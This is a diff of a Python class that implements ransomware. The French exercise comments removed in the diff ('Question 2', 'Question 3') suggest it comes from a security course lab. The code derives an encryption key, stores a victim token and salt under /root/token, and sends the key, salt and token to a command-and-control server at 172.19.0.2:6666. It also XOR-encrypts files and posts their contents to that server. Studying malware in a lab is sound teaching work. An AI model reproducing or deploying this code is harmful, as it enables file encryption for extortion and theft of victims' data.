@@ -29,6 +29,9 @@ class SecretManager:
 
         self._log = logging.getLogger(self.__class__.__name__)
 
+    """
+        Do the key derivation
+    """
     def do_derivation(self, salt:bytes, key:bytes)->bytes:
         # Salt derivation
         salt_derivation = PBKDF2HMAC(algorithm=hashes.SHA256(),
@@ -45,18 +48,10 @@ class SecretManager:
                         iterations=self.ITERATION)
 
         return kdf.derive(key), salt
-
-        # Other way to do it with secret library
-        # return secrets.token_bytes(16)
-
-        #########################
-        # Question 2. 
-        # #######################
-        # Il existe des dictionnaires faisant le liens avec les hashes 
-        # Il faut au moins du pseudo aléatoire?
-        # Le salt est stocké en local
         
-
+    """
+        Generate key, salt and the token
+    """
     def create(self)-> dict: # Tuple[bytes, bytes, bytes]:
         res = {
             "key": secrets.token_bytes(16),
@@ -67,10 +62,15 @@ class SecretManager:
         self._token= res["token"]
         return res
 
+    # Encode binary to base64
     def bin_to_b64(self, data:bytes)->str:
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
 
+    """
+        Send a post request to the CNC 
+        Payload : Key, Salt, Token
+    """
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
         payload = {
             "token" : self.bin_to_b64(token),
@@ -79,40 +79,45 @@ class SecretManager:
         }
         requests.post("http://172.19.0.2:6666/new", json=payload)    
 
-
+    """
+        Setup the Ransomware
+    """
     def setup(self)->None:
 
-        tokens = self.create()
+        tokens_generated = self.create()
 
-        key, self._salt = self.do_derivation(tokens["salt"], tokens["key"])
-        self._token = tokens["token"]
-        self._key = key
-        #m = sha256()
-        #m.update(token)
-        #TOKEN = str(m.hexdigest())
+        # Do the derivation key
+        self._key, self._salt = self.do_derivation(tokens_generated["salt"], tokens_generated["key"])
+        self._token = tokens_generated["token"]
+
+        # Create the client folder
         folder_token_name = "/root/token"
 
-        os.makedirs(folder_token_name, exist_ok=True)
+        # Token folder's existance verification
+        try:
+            os.makedirs(folder_token_name)
+        except:
+            return
 
+        # Create the binary token file
         with open(folder_token_name + "/token.bin", "wb") as f:
             f.write(self._token)
 
+        # Create the binary salt file
         with open(folder_token_name + "/salt.bin", "wb") as f:
             f.write(self._salt)
 
-        self.post_new(self._salt, key, tokens["token"])
+        # Send the Salt, Key and Token to the CNC
+        self.post_new(self._salt, self._key, self._token)
 
-        #################
-        # Question 3 
-        #################
-        # Eviter d'ecrire dans un 
-        # fichier contenant déjà qqc et 
-        # de perdre ainsi le token
 
     def load(self)->None:
         # function to load crypto data
         raise NotImplemented()
 
+    """
+        Verification that the key is correct
+    """
     def check_key(self, candidate_key:bytes)->bool:
         # Get the token user
         token = self.get_hex_token()
@@ -131,9 +136,13 @@ class SecretManager:
         else:
             return False
 
+    # Set the key
     def set_key(self, key:bytes)->None:
         self._key = key
 
+    """
+        Return the token in hexadecimal format
+    """
     def get_hex_token(self)->bytes:
         token = ""
         
@@ -142,13 +151,19 @@ class SecretManager:
 
         return token 
 
+    """
+        Encrypt a list of file
+    """
     def xorfiles(self, files:List[str])->None:
         for file in files:
             self._files_encrypted[str(file)] = xorfile(file, self._key)
         
-        
+    """
+        Leak the files to the CNC
+    """
     def leak_files(self, files:List[str])->None:
         
+        # Initiate the payload request
         payload = {}
         """
         for file in files:
@@ -157,10 +172,11 @@ class SecretManager:
                 requests.post("http://172.19.0.2:6666/files", json=payload)
             payload = {} 
 """
-        token = self.get_hex_token()
-        with open(files[0], "r") as f: 
-            payload["token"] = self.bin_to_b64(token) 
-            payload[str(files[0])]= f.read()
+        for file in files:
+            token = self.get_hex_token()
+            with open(file, "r") as f: 
+                payload["token"] = self.bin_to_b64(token) 
+                payload[str(file)]= f.read()
         requests.post("http://172.19.0.2:6666/files", json=payload)
            
         return {}
